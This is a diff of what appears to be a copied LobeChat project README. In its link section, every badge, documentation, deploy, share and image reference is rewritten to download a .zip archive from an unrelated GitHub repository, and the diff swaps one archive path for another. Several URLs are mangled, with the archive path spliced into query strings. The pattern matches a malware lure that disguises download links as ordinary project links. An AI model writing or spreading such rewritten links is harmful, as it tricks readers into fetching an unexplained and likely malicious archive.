 Every bit counts and your one-time donation sparkles in our galaxy of support! You're a shooting star, making a swift and bright impact on our journey. Thank you for believing in us – your generosity guides us toward our mission, one brilliant flash at a time.
 
-<a href="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip" target="_blank">
+<a href="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip" target="_blank">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
-    <img  src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
+    <img  src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
   </picture>
 </a>
 
@@ -670,137 +670,137 @@ This project is [Apache 2.0](./LICENSE) licensed.
 
 <!-- LINK GROUP -->
 
-[back-to-top]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[blog]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-desktop]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-desktop-report]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-mobile-report]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-plugin-sdk]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-plugin-template]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[chat-plugins-gateway]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[codecov-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[codecov-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[codespaces-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[codespaces-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[deploy-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[deploy-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat&env=OPENAI_API_KEY,ACCESS_CODE&envDescription=Find%20your%20OpenAI%20API%20Key%20by%20click%20the%20right%20Learn%20More%20button.%20%7C%20Access%20Code%20can%20protect%20your%20website&envLink=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Faccount%2Fapi-keys&project-name=lobe-chat&repository-name=lobe-chat
-[deploy-on-sealos-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[deploy-on-sealos-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%3FtemplateName%3Dlobe-chat
-[deploy-on-zeabur-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[deploy-on-zeabur-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[discord-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[discord-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[discord-shield-badge]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-pulls-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-pulls-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-size-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docker-size-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-dev-guide]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-docker]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-env-var]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-agent]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-auth]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-database]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-local]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-provider]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-pwa]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-t2i]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-tts]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-feat-vision]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-functionc-call]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-lighthouse]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-plugin-dev]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-self-hosting]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-upstream-sync]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-usage-ollama]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[docs-usage-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[fossa-license-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat
-[fossa-license-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-action-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-action-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-action-test-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-action-test-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-contributors-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-contributors-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-forks-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-forks-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-issues-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-issues-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-license-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-license-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%202.0-white?labelColor=black&style=flat-square
-[github-project-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-releasedate-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-releasedate-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-stars-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-stars-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-trending-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[github-trending-url]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-banner]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-agent]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-auth]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-database]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-local]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-privoder]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-pwa]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-t2i]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-tts]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-feat-vision]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-overview]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[image-star]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[issues-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-chat-plugins]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-commit]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-i18n]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-icons-github]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-icons-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-icons-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-lint-github]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-lint-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-lint-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-midjourney-webui]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-tts-github]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-tts-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-tts-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-ui-github]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-ui-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[lobe-ui-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[official-site]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[pr-welcome-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[pr-welcome-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip🤯_pr_welcome-%E2%86%92-ffcb47?labelColor=black&style=for-the-badge
-[profile-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[share-linkedin-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[share-linkedin-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20linkedin-black?labelColor=black&logo=linkedin&logoColor=white&style=flat-square
-[share-mastodon-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source,%20extensible%20(Function%20Calling),%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT/LLM%20web%20application.%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20#chatbot%20#chatGPT%20#openAI
-[share-mastodon-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20mastodon-black?labelColor=black&logo=mastodon&logoColor=white&style=flat-square
-[share-reddit-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat
-[share-reddit-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20reddit-black?labelColor=black&logo=reddit&logoColor=white&style=flat-square
-[share-telegram-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip"?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat
-[share-telegram-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20telegram-black?labelColor=black&logo=telegram&logoColor=white&style=flat-square
-[share-weibo-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat
-[share-weibo-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20weibo-black?labelColor=black&logo=sinaweibo&logoColor=white&style=flat-square
-[share-whatsapp-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat%20%23chatbot%20%23chatGPT%20%23openAI
-[share-whatsapp-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20whatsapp-black?labelColor=black&logo=whatsapp&logoColor=white&style=flat-square
-[share-x-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2CchatGPT%2CopenAI&text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobehub%2Flobe-chat
-[share-x-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20on%20x-black?labelColor=black&logo=x&logoColor=white&style=flat-square
-[sponsor-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip 'Become ❤️ LobeHub Sponsor'
-[sponsor-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20LobeHub-f04f88?logo=opencollective&logoColor=white&style=flat-square
-[submit-agents-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[submit-agents-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip🤖/🏪_submit_agent-%E2%86%92-c4f042?labelColor=black&style=for-the-badge
-[submit-plugin-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[submit-plugin-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip🧩/🏪_submit_plugin-%E2%86%92-95f3d9?labelColor=black&style=for-the-badge
-[vercel-link]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[vercel-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
-[vercel-shield-badge]: https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%20LOBECHAT-ONLINE-55b467?labelColor=black&logo=vercel&style=for-the-badge
+[back-to-top]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[blog]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-desktop]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-desktop-report]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-mobile-report]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-plugin-sdk]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-plugin-template]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[chat-plugins-gateway]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[codecov-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[codecov-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[codespaces-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[codespaces-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[deploy-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[deploy-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat&env=OPENAI_API_KEY,ACCESS_CODE&envDescription=Find%20your%20OpenAI%20API%20Key%20by%20click%20the%20right%20Learn%20More%20button.%20%7C%20Access%20Code%20can%20protect%20your%20website&envLink=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Faccount%2Fapi-keys&project-name=lobe-chat&repository-name=lobe-chat
+[deploy-on-sealos-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[deploy-on-sealos-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%3FtemplateName%3Dlobe-chat
+[deploy-on-zeabur-button-image]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[deploy-on-zeabur-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[discord-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[discord-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[discord-shield-badge]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-pulls-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-pulls-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-size-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docker-size-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-dev-guide]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-docker]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-env-var]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-agent]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-auth]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-database]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-local]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-provider]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-pwa]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-t2i]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-tts]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-feat-vision]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-functionc-call]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-lighthouse]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-plugin-dev]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-self-hosting]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-upstream-sync]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-usage-ollama]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[docs-usage-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[fossa-license-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat
+[fossa-license-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-action-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-action-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-action-test-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-action-test-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-contributors-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-contributors-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-forks-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-forks-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-issues-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-issues-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-license-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-license-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%202.0-white?labelColor=black&style=flat-square
+[github-project-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-release-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-release-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-releasedate-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-releasedate-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-stars-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-stars-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-trending-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[github-trending-url]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-banner]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-agent]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-auth]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-database]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-local]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-mobile]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-plugin]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-privoder]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-pwa]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-t2i]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
